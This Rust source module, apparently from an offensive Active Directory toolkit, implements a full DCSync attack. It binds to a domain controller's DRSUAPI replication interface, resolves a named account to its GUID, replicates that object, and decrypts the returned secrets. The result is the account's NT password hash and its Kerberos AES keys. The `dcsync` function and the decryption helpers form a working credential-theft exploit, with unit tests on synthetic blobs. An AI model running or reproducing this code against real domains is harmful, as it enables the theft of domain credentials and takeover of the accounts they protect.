//! DRSUAPI (MS-DRSR) — the directory replication interface used for DCSync.
//!
//! DCSync abuses replication: bind to DRSUAPI over a sign+sealed ncacn_ip_tcp channel
//! (`DRSBind`), then request a single object's secrets with `DRSGetNCChanges`
//! (EXOP_REPL_OBJ). The reply carries the account's attributes with the secrets encrypted
//! under the NTLM session key; a per-RID DES pass then recovers the NT hash.
//!
//! This module marshals the DRS structures by hand on top of [`crate::ndr`]. `DRSBind` is
//! implemented and validated live; `DRSGetNCChanges` builds on the same primitives.

use crate::ndr::{NdrDecoder, NdrEncoder};
use crate::transport::RpcTcp;
use crate::{epm, Result, RpcError, Syntax};
use adhammer_core::Guid;

/// DRSUAPI interface: e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0.
pub fn drsuapi_syntax() -> Syntax {
    Syntax::new("e3514235-4b06-11d1-ab04-00c04fc2dcd2", 4, 0)
}

/// NTDSAPI client GUID (the well-known value every DRS client presents).
const NTDSAPI_CLIENT_GUID: &str = "e24d201a-4fd6-11d1-a3da-0000f875ae0d";

pub mod opnum {
    pub const DRS_BIND: u16 = 0;
    pub const DRS_GET_NC_CHANGES: u16 = 3;
    pub const DRS_CRACK_NAMES: u16 = 12;
}

// DS_NAME_FORMAT (MS-DRSR 4.1.4.1.3).
const DS_NT4_ACCOUNT_NAME: u32 = 2;
const DS_UNIQUE_ID_NAME: u32 = 6; // "{objectGUID}"

// DRS_EXTENSIONS_INT dwFlags bits we advertise — enough for a V8 request / V6 reply with
// strong (session-key) encryption of the returned secrets.
const DRS_EXT_BASE: u32 = 0x0000_0001;
const DRS_EXT_STRONG_ENCRYPTION: u32 = 0x0000_8000;
const DRS_EXT_GETCHGREQ_V8: u32 = 0x0100_0000;
const DRS_EXT_GETCHGREPLY_V6: u32 = 0x0400_0000;

/// Parse a "{guid}" (or bare guid) string into the 16-byte DCE wire layout.
fn parse_guid_braced(s: &str) -> Result<[u8; 16]> {
    let t = s.trim().trim_start_matches('{').trim_end_matches('}');
    Guid::parse(t)
        .map(|g| g.0)
        .ok_or_else(|| RpcError::Protocol(format!("bad GUID '{s}'")))
}

/// Build the DRS_EXTENSIONS_INT rgb payload (the bytes that follow `cb`).
fn drs_extensions_rgb() -> Vec<u8> {
    let mut v = Vec::new();
    let flags =
        DRS_EXT_BASE | DRS_EXT_STRONG_ENCRYPTION | DRS_EXT_GETCHGREQ_V8 | DRS_EXT_GETCHGREPLY_V6;
    v.extend_from_slice(&flags.to_le_bytes()); // dwFlags
    v.extend_from_slice(&[0u8; 16]); // SiteObjGuid
    v.extend_from_slice(&0u32.to_le_bytes()); // Pid
    v.extend_from_slice(&0u32.to_le_bytes()); // dwReplEpoch
    v.extend_from_slice(&0u32.to_le_bytes()); // dwFlagsExt
    v.extend_from_slice(&[0u8; 16]); // ConfigObjGUID
    v.extend_from_slice(&0xffff_ffffu32.to_le_bytes()); // dwExtCaps
    v
}

/// An established DRS session: the sealed RPC connection plus the server-returned handle.
pub struct DrsSession {
    rpc: RpcTcp,
    handle: [u8; 20],
    session_key: [u8; 16],
}

impl DrsSession {
    /// Resolve DRSUAPI's dynamic port via the endpoint mapper, open a sign+sealed session,
    /// and `DRSBind` to obtain the replication handle.
    pub async fn bind(host: &str, domain: &str, user: &str, password: &str) -> Result<Self> {
        let port = epm::resolve_port(host, drsuapi_syntax()).await?;
        let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
        rpc.bind_sealed(drsuapi_syntax(), domain, user, password, "ADHAMMER")
            .await?;

        // IDL_DRSBind(puuidClientDsa [unique], pextClient [unique]) → (ppextServer, phDrs, ret)
        let mut e = NdrEncoder::new();
        e.referent(); // puuidClientDsa: non-null unique pointer
        e.uuid(&Guid::parse(NTDSAPI_CLIENT_GUID).expect("client GUID").0);
        e.referent(); // pextClient: non-null unique pointer to DRS_EXTENSIONS
        let rgb = drs_extensions_rgb();
        let cb = rgb.len() as u32;
        e.u32(cb); // conformant max_count (rgb is [size_is(cb)])
        e.u32(cb); // cb
        e.bytes(&rgb);
        while e.len() % 4 != 0 {
            e.u8(0);
        }
        let resp = rpc.call_sealed(opnum::DRS_BIND, &e.into_bytes()).await?;

        // Reply: ppextServer [ref] → DRS_EXTENSIONS, phDrs (20-byte context handle), retval.
        let mut d = NdrDecoder::new(&resp);
        let _server_ext_ref = d.u32()?;
        let _max = d.u32()?;
        let server_cb = d.u32()? as usize;
        let _server_rgb = d.read_bytes(server_cb)?;
        while d.position() % 4 != 0 {
            d.u8()?;
        }
        let handle: [u8; 20] = d.read_bytes(20)?.try_into().unwrap();
        let retval = d.u32().unwrap_or(0);
        if retval != 0 {
            return Err(RpcError::Protocol(format!(
                "DRSBind failed: 0x{retval:08x}"
            )));
        }
        let session_key = rpc
            .session_key()
            .ok_or_else(|| RpcError::Protocol("no session key".into()))?;
        Ok(DrsSession {
            rpc,
            handle,
            session_key,
        })
    }

    pub fn handle(&self) -> &[u8; 20] {
        &self.handle
    }

    /// DRSCrackNames: resolve `DOMAIN\name` (NT4 format) to the target's objectGUID.
    /// Uses the V1 request/reply. Returns the 16-byte GUID (DCE wire layout).
    pub async fn crack_name_to_guid(
        &mut self,
        netbios_domain: &str,
        name: &str,
    ) -> Result<[u8; 16]> {
        let offered = format!("{netbios_domain}\\{name}");
        let mut e = NdrEncoder::new();
        e.bytes(&self.handle); // hDrs context handle (20 bytes, [ref])
        e.u32(1); // dwInVersion = 1
                  // pmsgIn [ref, switch_is(1)] → non-encapsulated union: switch value then the V1 arm.
        e.u32(1); // union discriminant = 1
        e.u32(0); // CodePage
        e.u32(0); // LocaleId
        e.u32(0); // dwFlags
        e.u32(DS_NT4_ACCOUNT_NAME); // formatOffered
        e.u32(DS_UNIQUE_ID_NAME); // formatDesired
        e.u32(1); // cNames
        e.referent(); // rpNames (embedded pointer to the array)
        e.u32(1); // conformant max_count of the pointer array
        e.referent(); // rpNames[0] (pointer to the string)
        e.conformant_varying_wstr(&offered);
        let resp = self
            .rpc
            .call_sealed(opnum::DRS_CRACK_NAMES, &e.into_bytes())
            .await?;

        // Reply: pdwOutVersion (u32), then DRS_MSG_CRACKREPLY union (switch=1) → DS_NAME_RESULTW*
        //   { cItems, [ref] rItems* → [ cItems × { status u32, pDomain wstr*, pName wstr* } ] }
        let mut d = NdrDecoder::new(&resp);
        let _out_version = d.u32()?;
        let _union_switch = d.u32()?;
        let _presult_ref = d.u32()?; // pResult [ref] referent
        let c_items = d.u32()?;
        let _ritems_ref = d.u32()?; // rItems [ref] referent
        let _max = d.u32()?; // conformant max_count of the item array
        if c_items == 0 {
            return Err(RpcError::Protocol("CrackNames returned no items".into()));
        }
        // Item array: fixed fields first (status + two string referents), then the strings.
        let status = d.u32()?;
        let dom_ref = d.u32()?;
        let name_ref = d.u32()?;
        if status != 0 {
            return Err(RpcError::Protocol(format!(
                "CrackNames status {status} (name not found?)"
            )));
        }
        if dom_ref != 0 {
            let _dom = d.conformant_varying_wstr()?;
        }
        if name_ref == 0 {
            return Err(RpcError::Protocol(
                "CrackNames: no cracked name returned".into(),
            ));
        }
        let cracked = d.conformant_varying_wstr()?; // "{guid}"
        parse_guid_braced(&cracked)
    }

    /// DRSGetNCChanges V8, single-object (EXOP_REPL_OBJ): replicate exactly the target
    /// object identified by `guid`. Returns the raw reply stub for attribute extraction.
    pub async fn get_nc_changes(&mut self, guid: &[u8; 16]) -> Result<Vec<u8>> {
        const EXOP_REPL_OBJ: u32 = 6;
        let mut e = NdrEncoder::new();
        e.bytes(&self.handle); // hDrs (20)
        e.u32(8); // dwInVersion
        e.u32(8); // union discriminant
        e.align(8); // the V8 arm has u64 members → 8-byte aligned after the discriminant

        // DRS_MSG_GETCHGREQ_V8 — fixed part (embedded pointer pointees are deferred).
        e.uuid(&[0u8; 16]); // uuidDsaObjDest
        e.uuid(&[0u8; 16]); // uuidInvocIdSrc
        e.referent(); // pNC (non-null)
        e.u64(0); // usnvecFrom.usnHighObjUpdate
        e.u64(0); // usnvecFrom.usnReserved
        e.u64(0); // usnvecFrom.usnHighPropUpdate
        e.null_ptr(); // pUpToDateVecDest
        e.u32(0); // ulFlags
        e.u32(1); // cMaxObjects
        e.u32(0); // cMaxBytes
        e.u32(EXOP_REPL_OBJ); // ulExtendedOp
        e.u64(0); // liFsmoInfo
        e.null_ptr(); // pPartialAttrSet
        e.null_ptr(); // pPartialAttrSetEx
        e.u32(0); // PrefixTableDest.PrefixCount
        e.null_ptr(); // PrefixTableDest.pPrefixEntry

        // Deferred: pNC pointee = DSNAME (conformant struct; StringName max_count first).
        e.u32(1); // StringName conformant max_count (NameLen + terminating null)
        e.u32(58); // structLen
        e.u32(0); // SidLen
        e.uuid(guid); // Guid (the target)
        e.bytes(&[0u8; 28]); // Sid
        e.u32(0); // NameLen
        e.u16(0); // StringName[0] = NUL
        while e.len() % 4 != 0 {
            e.u8(0);
        }

        let resp = self
            .rpc
            .call_sealed(opnum::DRS_GET_NC_CHANGES, &e.into_bytes())
            .await?;
        Ok(resp)
    }

    /// Full single-object DCSync: crack the name to a GUID, replicate the object, and decrypt
    /// its NT hash + Kerberos keys. Returns (rid, nt_hash, kerberos_keys).
    pub async fn dcsync(
        &mut self,
        netbios_domain: &str,
        name: &str,
    ) -> Result<(u32, [u8; 16], Vec<KerbKey>)> {
        let guid = self.crack_name_to_guid(netbios_domain, name).await?;
        let reply = self.get_nc_changes(&guid).await?;
        if let Ok(path) = std::env::var("ADHAMMER_DUMP_REPLY") {
            let _ = std::fs::write(&path, &reply);
            eprintln!("[dbg] wrote {} bytes of DRS reply to {path}", reply.len());
        }
        let (rid, nt_enc, supp_enc) = parse_repl_object(&reply)?;
        if nt_enc.is_empty() {
            return Err(RpcError::Protocol(
                "object has no unicodePwd (machine/empty?)".into(),
            ));
        }
        let nt = drs_decrypt_hash(&self.session_key, &nt_enc, rid)?;
        // supplementalCredentials → Kerberos AES/DES keys (best-effort; absent on some accounts).
        let kerb = if supp_enc.is_empty() {
            Vec::new()
        } else {
            let blob = drs_decrypt_blob(&self.session_key, &supp_enc).unwrap_or_default();
            if std::env::var("ADHAMMER_DUMP_SUPP").is_ok() {
                eprintln!(
                    "[supp] {}",
                    blob.iter().map(|b| format!("{b:02x}")).collect::<String>()
                );
            }
            parse_kerberos_keys(&blob)
        };
        Ok((rid, nt, kerb))
    }
}

// DRS ATTRTYPs: unicodePwd (RC4/DES-wrapped NT hash) and supplementalCredentials (Kerberos keys).
const ATTR_UNICODE_PWD: u32 = 0x0009_005a;
const ATTR_SUPPLEMENTAL_CREDENTIALS: u32 = 0x0009_007d;

/// Walk the DRS_MSG_GETCHGREPLY_V6 to the single replicated object; return
/// (rid, encrypted unicodePwd, encrypted supplementalCredentials). Walks all attribute values.
fn parse_repl_object(reply: &[u8]) -> Result<(u32, Vec<u8>, Vec<u8>)> {
    let mut d = NdrDecoder::new(reply);
    // --- V6 fixed part ---
    d.u32()?;
    d.u32()?; // pdwOutVersion, union switch
    d.read_bytes(16)?;
    d.read_bytes(16)?; // uuidDsaObjSrc, uuidInvocIdSrc
    d.u32()?; // pNC ref
    d.align(8);
    d.read_bytes(24)?;
    d.read_bytes(24)?; // usnvecFrom, usnvecTo
    d.u32()?; // pUpToDateVecSrc ref
    let pfx_count = d.u32()?;
    d.u32()?; // PrefixTableSrc { count, ptr }
    d.u32()?;
    d.u32()?;
    d.u32()?; // ulExtendedRet, cNumObjects, cNumBytes
    d.u32()?; // pObjects ref
    d.u32()?; // fMoreData
    d.u32()?;
    d.u32()?;
    d.u32()?;
    d.u32()?;
    d.u32()?; // cNumNcSizeObjects/Values, cNumValues, rgValues, dwDRSError

    // --- deferred: pNC DSNAME ---
    skip_dsname(&mut d)?;
    // --- deferred: prefix table (count entries, then each OID's byte array) ---
    let ptmc = d.u32()?;
    let mut oid_lens = Vec::with_capacity(ptmc as usize);
    for _ in 0..ptmc {
        d.u32()?; // ndx
        oid_lens.push(d.u32()?); // OID length
        d.u32()?; // OID elements ptr
    }
    for l in oid_lens {
        if l > 0 {
            let m = d.u32()?;
            d.read_bytes(m as usize)?;
            d.align(4);
        }
    }
    let _ = pfx_count;

    // --- deferred: pObjects (REPLENTINFLIST) ---
    d.u32()?; // pNextEntInf ref
    d.u32()?; // ENTINF.pName ref
    d.u32()?; // ENTINF.ulFlags
    let attr_count = d.u32()?; // ATTRBLOCK.attrCount
    d.u32()?; // pAttr ref
    d.u32()?; // fIsNCPrefix
    d.u32()?; // pParentGuid ref
    d.u32()?; // pMetaDataExt ref

    // deferred within REPLENTINFLIST: pName DSNAME (carries the object SID → RID)
    let rid = read_dsname_rid(&mut d)?;

    // ATTR array (conformant): max_count then attr_count × (attrTyp, valCount, pAVal ref)
    let amc = d.u32()?;
    let mut triples = Vec::with_capacity(amc as usize);
    for _ in 0..amc {
        let at = d.u32()?;
        let vc = d.u32()?;
        let pav = d.u32()?;
        triples.push((at, vc, pav));
    }
    let _ = attr_count;

    // Per-attribute values (deferred, in attribute order). Walk all — supplementalCredentials
    // may follow unicodePwd — capturing both by ATTRTYP.
    let (mut nt_enc, mut supp_enc) = (Vec::new(), Vec::new());
    for (at, vc, pav) in triples {
        if pav == 0 || vc == 0 {
            continue;
        }
        let vmc = d.u32()?;
        let mut vptrs = Vec::with_capacity(vmc as usize);
        for _ in 0..vmc {
            d.u32()?; // valLen
            vptrs.push(d.u32()?); // pVal ref
        }
        let mut first = Vec::new();
        for (i, pv) in vptrs.iter().enumerate() {
            if *pv != 0 {
                let m = d.u32()?;
                let b = d.read_bytes(m as usize)?.to_vec();
                d.align(4);
                if i == 0 {
                    first = b;
                }
            }
        }
        match at {
            ATTR_UNICODE_PWD => nt_enc = first,
            ATTR_SUPPLEMENTAL_CREDENTIALS => supp_enc = first,
            _ => {}
        }
    }
    Ok((rid, nt_enc, supp_enc))
}

/// Consume a DSNAME (conformant struct); discard it.
fn skip_dsname(d: &mut NdrDecoder) -> Result<()> {
    let mc = d.u32()?; // StringName max_count
    d.u32()?; // structLen
    d.u32()?; // SidLen
    d.read_bytes(16)?; // Guid
    d.read_bytes(28)?; // Sid
    d.u32()?; // NameLen
    d.read_bytes(mc as usize * 2)?; // StringName
    d.align(4);
    Ok(())
}

/// Consume a DSNAME and return the RID from its embedded SID (last sub-authority).
fn read_dsname_rid(d: &mut NdrDecoder) -> Result<u32> {
    let mc = d.u32()?;
    d.u32()?; // structLen
    let sid_len = d.u32()?;
    d.read_bytes(16)?; // Guid
    let sid = d.read_bytes(28)?.to_vec();
    d.u32()?; // NameLen
    d.read_bytes(mc as usize * 2)?;
    d.align(4);
    if sid_len >= 8 {
        let count = sid[1] as usize;
        let off = 2 + 6 + (count - 1) * 4;
        return Ok(u32::from_le_bytes(sid[off..off + 4].try_into().unwrap()));
    }
    Err(RpcError::Protocol("object DSNAME has no SID".into()))
}

// -------------------------------------------------------------------------------------------
// DRS secret decryption (MS-DRSR 5.16.4): session-key MD5/RC4 unwrap, then per-RID DES.
// -------------------------------------------------------------------------------------------

fn drs_decrypt_hash(session_key: &[u8; 16], enc: &[u8], rid: u32) -> Result<[u8; 16]> {
    use md5::{Digest, Md5};
    if enc.len() < 20 {
        return Err(RpcError::Protocol("encrypted value too short".into()));
    }
    // Outer layer: RC4 keyed by MD5(sessionKey || salt); salt is the first 16 bytes.
    let salt = &enc[0..16];
    let mut md5 = Md5::new();
    md5.update(session_key);
    md5.update(salt);
    let rc4key = md5.finalize();
    let plain = adhammer_ntlm::Rc4::new(&rc4key).apply(&enc[16..]); // CRC32(4) + wrapped(16)
    if plain.len() < 20 {
        return Err(RpcError::Protocol("decrypted value too short".into()));
    }
    Ok(remove_des_layer(&plain[4..20], rid))
}

/// RC4 session-key unwrap of a DRS-encrypted blob (e.g. supplementalCredentials), returning the
/// plaintext after the 16-byte salt and the 4-byte CRC — no per-RID DES (that's only for the
/// 16-byte password hashes).
fn drs_decrypt_blob(session_key: &[u8; 16], enc: &[u8]) -> Result<Vec<u8>> {
    use md5::{Digest, Md5};
    if enc.len() < 20 {
        return Err(RpcError::Protocol("encrypted blob too short".into()));
    }
    let salt = &enc[0..16];
    let mut md5 = Md5::new();
    md5.update(session_key);
    md5.update(salt);
    let rc4key = md5.finalize();
    let plain = adhammer_ntlm::Rc4::new(&rc4key).apply(&enc[16..]);
    Ok(plain.get(4..).map(|s| s.to_vec()).unwrap_or_default()) // strip CRC32
}

/// One Kerberos key from supplementalCredentials.
pub struct KerbKey {
    pub keytype: u32, // 18 = AES256, 17 = AES128, 3 = DES-CBC-MD5, 23 = RC4
    pub key: Vec<u8>,
}

impl KerbKey {
    pub fn etype_name(&self) -> &'static str {
        match self.keytype {
            20 => "aes256-cts-hmac-sha384-192", // RFC 8009 (Server 2022+/2025)
            19 => "aes128-cts-hmac-sha256-128", // RFC 8009 (Server 2022+/2025)
            18 => "aes256-cts-hmac-sha1-96",
            17 => "aes128-cts-hmac-sha1-96",
            23 => "rc4-hmac",
            3 | 1 => "des-cbc-md5",
            _ => "unknown",
        }
    }
}

/// Parse a decrypted `supplementalCredentials` (USER_PROPERTIES, MS-SAMR 2.2.10) for the
/// `Primary:Kerberos-Newer-Keys` package → the current AES256/AES128 keys.
pub fn parse_kerberos_keys(user_properties: &[u8]) -> Vec<KerbKey> {
    let up = user_properties;
    // USER_PROPERTIES header is 0x6F (111) bytes: Reserved1(4) Length(4) Reserved2(2)
    // Reserved3(2) Reserved4(96) PropertySignature(2)=0x50, then PropertyCount(2) @ 110.
    if up.len() < 112 || u16::from_le_bytes([up[108], up[109]]) != 0x50 {
        return Vec::new();
    }
    let prop_count = u16::from_le_bytes([up[110], up[111]]) as usize;
    let mut i = 112;
    for _ in 0..prop_count {
        if i + 6 > up.len() {
            break;
        }
        let name_len = u16::from_le_bytes([up[i], up[i + 1]]) as usize;
        let val_len = u16::from_le_bytes([up[i + 2], up[i + 3]]) as usize;
        i += 6; // NameLength, ValueLength, Reserved
        let Some(name_b) = up.get(i..i + name_len) else {
            break;
        };
        let name: String = name_b
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]) as u8 as char)
            .collect();
        i += name_len;
        let Some(val_hex) = up.get(i..i + val_len) else {
            break;
        };
        i += val_len;
        if name == "Primary:Kerberos-Newer-Keys" {
            // PropertyValue is ASCII-hex of the KERB_STORED_CREDENTIAL_NEW.
            if let Ok(blob) = hex::decode(val_hex) {
                return parse_kerb_newer_keys(&blob);
            }
        }
    }
    Vec::new()
}

/// KERB_STORED_CREDENTIAL_NEW → the current credential set's keys (MS-SAMR 2.2.10.6/2.2.10.8).
fn parse_kerb_newer_keys(b: &[u8]) -> Vec<KerbKey> {
    let u16 = |o: usize| u16::from_le_bytes([b[o], b[o + 1]]);
    let u32 = |o: usize| u32::from_le_bytes([b[o], b[o + 1], b[o + 2], b[o + 3]]);
    if b.len() < 24 {
        return Vec::new();
    }
    // KERB_STORED_CREDENTIAL_NEW: Revision(2) Flags(2) CredentialCount(2) @4 ...
    let cred_count = u16(4) as usize; // CredentialCount (current keys)
    let mut out = Vec::new();
    // KERB_KEY_DATA_NEW array begins at offset 24; each entry is 24 bytes.
    for n in 0..cred_count {
        let base = 24 + n * 24;
        if base + 24 > b.len() {
            break;
        }
        // KERB_KEY_DATA_NEW: Reserved1(2) Reserved2(2) Reserved3(4) IterationCount(4)
        // KeyType(4)@12 KeyLength(4)@16 KeyOffset(4)@20.
        let keytype = u32(base + 12);
        let key_len = u32(base + 16) as usize;
        let key_off = u32(base + 20) as usize;
        if let Some(k) = b.get(key_off..key_off + key_len) {
            out.push(KerbKey {
                keytype,
                key: k.to_vec(),
            });
        }
    }
    out
}

/// Undo the per-RID DES layer that wraps the stored NT hash.
fn remove_des_layer(data: &[u8], rid: u32) -> [u8; 16] {
    use des::cipher::generic_array::GenericArray;
    use des::cipher::{BlockDecrypt, KeyInit};
    use des::Des;
    let (k1, k2) = rid_to_des_keys(rid);
    let mut out = [0u8; 16];
    let c1 = Des::new(GenericArray::from_slice(&k1));
    let mut b0 = *GenericArray::from_slice(&data[0..8]);
    c1.decrypt_block(&mut b0);
    let c2 = Des::new(GenericArray::from_slice(&k2));
    let mut b1 = *GenericArray::from_slice(&data[8..16]);
    c2.decrypt_block(&mut b1);
    out[0..8].copy_from_slice(&b0);
    out[8..16].copy_from_slice(&b1);
    out
}

fn rid_to_des_keys(rid: u32) -> ([u8; 8], [u8; 8]) {
    let r = rid.to_le_bytes();
    let k1 = [r[0], r[1], r[2], r[3], r[0], r[1], r[2]];
    let k2 = [r[3], r[0], r[1], r[2], r[3], r[0], r[1]];
    (str_to_des_key(&k1), str_to_des_key(&k2))
}

/// Expand 7 key bytes into an 8-byte DES key (7 bits/byte, parity bit cleared).
fn str_to_des_key(s: &[u8; 7]) -> [u8; 8] {
    let mut k = [0u8; 8];
    k[0] = s[0] >> 1;
    k[1] = ((s[0] & 0x01) << 6) | (s[1] >> 2);
    k[2] = ((s[1] & 0x03) << 5) | (s[2] >> 3);
    k[3] = ((s[2] & 0x07) << 4) | (s[3] >> 4);
    k[4] = ((s[3] & 0x0f) << 3) | (s[4] >> 5);
    k[5] = ((s[4] & 0x1f) << 2) | (s[5] >> 6);
    k[6] = ((s[5] & 0x3f) << 1) | (s[6] >> 7);
    k[7] = s[6] & 0x7f;
    for b in k.iter_mut() {
        *b <<= 1;
    }
    k
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extensions_rgb_shape() {
        let rgb = drs_extensions_rgb();
        assert_eq!(rgb.len(), 52); // dwFlags+SiteObjGuid+Pid+ReplEpoch+FlagsExt+ConfigObjGUID+ExtCaps
        let flags = u32::from_le_bytes(rgb[0..4].try_into().unwrap());
        assert_eq!(flags & DRS_EXT_GETCHGREPLY_V6, DRS_EXT_GETCHGREPLY_V6);
        assert_eq!(flags & DRS_EXT_STRONG_ENCRYPTION, DRS_EXT_STRONG_ENCRYPTION);
    }

    #[test]
    fn syntax_uuid_parses() {
        let s = drsuapi_syntax();
        assert_eq!(s.ver_major, 4);
        assert_ne!(s.uuid, [0u8; 16]);
    }

    /// Fuzz-lite: `parse_repl_object` walks a DRSGetNCChanges reply (deferred NDR pointers,
    /// prefix table, REPLENTINFLIST). This is the most intricate wire parser in the tree and it
    /// reads DC-supplied bytes — it must never panic on a malformed/hostile reply.
    #[test]
    fn fuzz_parse_repl_object_never_panics() {
        let mut s: u64 = 0xD25A_0FED_1234_ABCD;
        let mut rng = || {
            s ^= s >> 12;
            s ^= s << 25;
            s ^= s >> 27;
            s.wrapping_mul(0x2545_F491_4F6C_DD1D)
        };
        let prev = std::panic::take_hook();
        std::panic::set_hook(Box::new(|_| {}));
        let mut fail = None;
        for _ in 0..200_000 {
            let n = rng() as usize % 512;
            let mut buf: Vec<u8> = (0..n).map(|_| rng() as u8).collect();
            // Bias some bytes toward small counts/offsets so the walker descends rather than
            // bailing immediately (drives coverage of the deferred-pointer paths).
            for _ in 0..(rng() as usize % 8) {
                if !buf.is_empty() {
                    let i = rng() as usize % buf.len();
                    buf[i] = (rng() % 4) as u8;
                }
            }
            let b = buf.clone();
            if std::panic::catch_unwind(|| {
                let _ = parse_repl_object(&b);
            })
            .is_err()
            {
                fail = Some(buf);
                break;
            }
        }
        std::panic::set_hook(prev);
        if let Some(buf) = fail {
            panic!(
                "parse_repl_object panicked on {} bytes: {}",
                buf.len(),
                buf.iter().map(|x| format!("{x:02x}")).collect::<String>()
            );
        }
    }

    /// Lock the USER_PROPERTIES → Kerberos-Newer-Keys parser offsets against a synthetic blob
    /// carrying one AES256 and one AES128 current key (MS-SAMR 2.2.10).
    #[test]
    fn parse_kerberos_keys_synthetic() {
        let aes256 = vec![0xAAu8; 32];
        let aes128 = vec![0xBBu8; 16];

        // KERB_STORED_CREDENTIAL_NEW: 24-byte header, then two 24-byte KERB_KEY_DATA_NEW, then keys.
        let mut cred = Vec::new();
        cred.extend_from_slice(&4u16.to_le_bytes()); // Revision
        cred.extend_from_slice(&0u16.to_le_bytes()); // Flags
        cred.extend_from_slice(&2u16.to_le_bytes()); // CredentialCount = 2
        cred.extend_from_slice(&0u16.to_le_bytes()); // ServiceCredentialCount
        cred.extend_from_slice(&0u16.to_le_bytes()); // OldCredentialCount
        cred.extend_from_slice(&0u16.to_le_bytes()); // OlderCredentialCount
        cred.extend_from_slice(&0u16.to_le_bytes()); // DefaultSaltLength
        cred.extend_from_slice(&0u16.to_le_bytes()); // DefaultSaltMaximumLength
        cred.extend_from_slice(&0u32.to_le_bytes()); // DefaultSaltOffset
        cred.extend_from_slice(&4096u32.to_le_bytes()); // DefaultIterationCount
        assert_eq!(cred.len(), 24);
        let key0_off = 24 + 24 * 2; // after both key-data entries
        let key1_off = key0_off + aes256.len();
        // KERB_KEY_DATA_NEW #0 (AES256)
        cred.extend_from_slice(&0u16.to_le_bytes()); // Reserved1
        cred.extend_from_slice(&0u16.to_le_bytes()); // Reserved2
        cred.extend_from_slice(&0u32.to_le_bytes()); // Reserved3
        cred.extend_from_slice(&4096u32.to_le_bytes()); // IterationCount
        cred.extend_from_slice(&18u32.to_le_bytes()); // KeyType = AES256
        cred.extend_from_slice(&(aes256.len() as u32).to_le_bytes());
        cred.extend_from_slice(&(key0_off as u32).to_le_bytes());
        // KERB_KEY_DATA_NEW #1 (AES128)
        cred.extend_from_slice(&0u16.to_le_bytes());
        cred.extend_from_slice(&0u16.to_le_bytes());
        cred.extend_from_slice(&0u32.to_le_bytes());
        cred.extend_from_slice(&4096u32.to_le_bytes());
        cred.extend_from_slice(&17u32.to_le_bytes()); // KeyType = AES128
        cred.extend_from_slice(&(aes128.len() as u32).to_le_bytes());
        cred.extend_from_slice(&(key1_off as u32).to_le_bytes());
        cred.extend_from_slice(&aes256);
        cred.extend_from_slice(&aes128);

        // PropertyValue is ASCII-hex of the credential blob.
        let val_hex = hex::encode(&cred);
        let name: Vec<u16> = "Primary:Kerberos-Newer-Keys".encode_utf16().collect();
        let mut name_b = Vec::new();
        for c in &name {
            name_b.extend_from_slice(&c.to_le_bytes());
        }

        // USER_PROPERTIES
        let mut up = vec![0u8; 108];
        up.extend_from_slice(&0x50u16.to_le_bytes()); // PropertySignature @108
        up.extend_from_slice(&1u16.to_le_bytes()); // PropertyCount @110
                                                   // one USER_PROPERTY
        up.extend_from_slice(&(name_b.len() as u16).to_le_bytes());
        up.extend_from_slice(&(val_hex.len() as u16).to_le_bytes());
        up.extend_from_slice(&0u16.to_le_bytes()); // Reserved
        up.extend_from_slice(&name_b);
        up.extend_from_slice(val_hex.as_bytes());
        up.push(0); // Reserved5

        let keys = parse_kerberos_keys(&up);
        assert_eq!(keys.len(), 2);
        assert_eq!(keys[0].keytype, 18);
        assert_eq!(keys[0].key, aes256);
        assert_eq!(keys[0].etype_name(), "aes256-cts-hmac-sha1-96");
        assert_eq!(keys[1].keytype, 17);
        assert_eq!(keys[1].key, aes128);
    }

    #[test]
    fn parse_kerberos_keys_rejects_garbage() {
        assert!(parse_kerberos_keys(&[]).is_empty());
        assert!(parse_kerberos_keys(&[0u8; 200]).is_empty()); // no 0x50 signature
    }
}
